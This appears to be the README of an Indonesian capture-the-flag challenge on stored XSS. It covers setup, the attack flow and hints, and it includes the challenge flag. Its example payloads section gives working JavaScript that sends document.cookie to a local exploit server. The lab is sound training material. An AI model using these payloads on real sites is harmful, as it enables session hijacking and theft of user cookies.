# XSS02 - Stored XSS Challenge

## Deskripsi

Challenge ini mendemonstrasikan kerentanan **Stored XSS (Cross-Site Scripting)**. Stored XSS terjadi ketika input berbahaya disimpan di server dan dieksekusi setiap kali halaman yang mengandung data tersebut dimuat.

## Objective

Eksploitasi kerentanan Stored XSS untuk mencuri cookie session admin dan mendapatkan flag.

## Flag

**AKAMSI{st0r3d_xss_c4n_st34l_c00k13s_4nd_s3ss10ns}**

## Setup

### Menggunakan Docker Compose (Recommended)

```bash
# Build dan jalankan semua services
docker-compose up --build

# Challenge akan tersedia di:
# - Main app: http://localhost:5012
# - Exploit server: http://localhost:8080
# - Selenium Grid: http://localhost:4444
# - VNC viewer (debugging): http://localhost:7900
```

### Manual Build

```bash
# Build Docker image
docker build -t xss02-stored .

# Jalankan dengan Selenium Grid terpisah
docker run -d --name selenium-chrome selenium/standalone-chrome:latest
docker run -p 5012:5012 -p 8080:8080 --link selenium-chrome xss02-stored
```

## Cara Bermain

1. Akses aplikasi di `http://localhost:5012`
2. Explore sistem komentar dan coba posting komentar
3. Perhatikan bahwa admin akan mengunjungi halaman setelah Anda posting komentar
4. Craft XSS payload yang akan mencuri cookie admin
5. Submit komentar dengan payload XSS
6. Check exploit server logs di `http://localhost:5012/exploit_server`
7. Temukan flag dalam cookie yang tercuri

## Attack Flow

1. **Post Malicious Comment**: Submit komentar dengan JavaScript payload
2. **Admin Simulation**: Admin otomatis mengunjungi halaman (simulasi)
3. **XSS Execution**: Payload dieksekusi di browser admin
4. **Data Exfiltration**: Cookie admin dikirim ke exploit server
5. **Flag Capture**: Flag ditemukan dalam cookie yang tercuri

## Example Payloads

```javascript
// Basic alert test
<script>alert('XSS')</script>

// Cookie stealing
<script>fetch('http://localhost:8080?cookie=' + document.cookie)</script>

// Image tag with onerror
<img src=x onerror="window.open('http://localhost:8080?data=' + btoa(document.cookie))">

// Fetch with base64 encoding
<script>fetch('http://localhost:8080?stolen=' + btoa(document.cookie))</script>
```

## Learning Points

- **Stored XSS**: Payload disimpan di database dan dieksekusi berulang kali
- **Persistence**: Berbeda dengan reflected XSS, stored XSS bersifat persisten
- **Impact**: Dapat mencuri cookie, session, atau melakukan aksi atas nama user
- **Exploit Server**: Teknik umum untuk menerima data yang dicuri
- **Session Hijacking**: Menggunakan cookie yang dicuri untuk impersonasi

## Technical Details

- Framework: Flask (Python) + SQLite
- Port: 5012 (main app), 8080 (exploit server)
- VPN: Optional OpenVPN support
- Database: SQLite untuk menyimpan komentar
- Browser: Selenium Grid dengan Chrome standalone
- Selenium: Remote WebDriver automation untuk realistic user behavior
- Architecture: Multi-container dengan dedicated Selenium service

## Exploit Server

Challenge ini menyediakan exploit server sederhana di port 8080 yang:
- Mencatat semua request yang masuk
- Menampilkan data yang tercuri dalam format yang mudah dibaca
- Mendeteksi flag dalam cookie yang tercuri
- Menyediakan endpoint untuk menerima data exfiltration

## Hints

- Admin akan mengunjungi halaman komentar 3 detik setelah Anda posting
- Cookie admin mengandung flag yang Anda cari
- Gunakan `document.cookie` untuk mengakses cookie
- Exploit server menerima data via query parameter
- Check developer tools untuk debugging XSS payload

**Note**: Challenge ini aman untuk pembelajaran - hanya berjalan di environment terisolasi dengan admin simulation.